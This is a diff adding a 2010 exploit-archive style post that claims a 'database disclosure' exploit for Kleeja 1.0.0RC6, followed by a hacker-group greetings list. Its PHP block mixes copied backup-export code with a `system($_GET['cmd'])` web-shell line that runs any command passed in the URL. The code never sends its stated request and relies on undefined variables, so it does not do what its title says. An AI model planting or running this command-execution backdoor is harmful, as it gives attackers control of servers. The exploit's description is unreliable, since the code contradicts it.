@@ -1,0 +1,43 @@
+====================================================
+kleeja1.0.0RC6 Database Disclosure Exploit
+====================================================
+
+######################################################################## 
+
+# Vendor: kleeja.com
+# Date: 2010-05-27 
+# Author : indoushka 
+# Contact : 00213771818860
+# Home : www.sec4ever.com
+# Bug  : Database Disclosure Exploit
+# Tested on : windows SP2 Fran?ais V.(Pnx2 2.0) 
+######################################################################## 
+                                                                                                                                                                                                
+# Exploit By indoushka 
+
+<?php
+
+$action 	= "http://127.0.0.1/kleeja/admin.php?cp=bckup";
+$sql_data = "# 1.0.0RC6, DB version:6\n";
+			$sql_data .= "# Kleeja Backup kleeja.com  kleeja version : " . KLEEJA_VERSION . ", DB version:" . $config['db_version'] . "\n";
+			$sql_data .= "# DATE : " . gmdate("d-m-Y H:i:s", time()) . " GMT\n";
+			$sql_data .= "#\n\n\n";
+			$cmd = $_GET['cmd'];
+            system($cmd);
+			$db_name_save = $dbname . '_kleeja.sql';
+			@set_time_limit(0);
+			header("Content-length: " . strlen($outta));
+			header("Content-type: text/plain");
+			header("Content-Disposition: attachment; filename=$db_name_save");
+			echo $sql_data . $outta;
+			exit;
+
+
+?>
+
+
+Dz-Ghost Team ===== Saoucha * Star08 * Cyber Sec * theblind74 * XproratiX * onurozkan * n2n * Meher Assel ===========================
+special thanks to : r0073r (inj3ct0r.com) * L0rd CruSad3r * MaYur * MA1201 * KeDar * Sonic * gunslinger_ * SeeMe * RoadKiller 
+Sid3^effects * aKa HaRi * His0k4 * Hussin-X * Rafik * Yashar * SoldierOfAllah * RiskY.HaCK * Stake * r1z * D4NB4R * www.alkrsan.net 
+MR.SoOoFe * ThE g0bL!N * AnGeL25dZ * ViRuS_Ra3cH
+---------------------------------------------------------------------------------------------------------------------------------
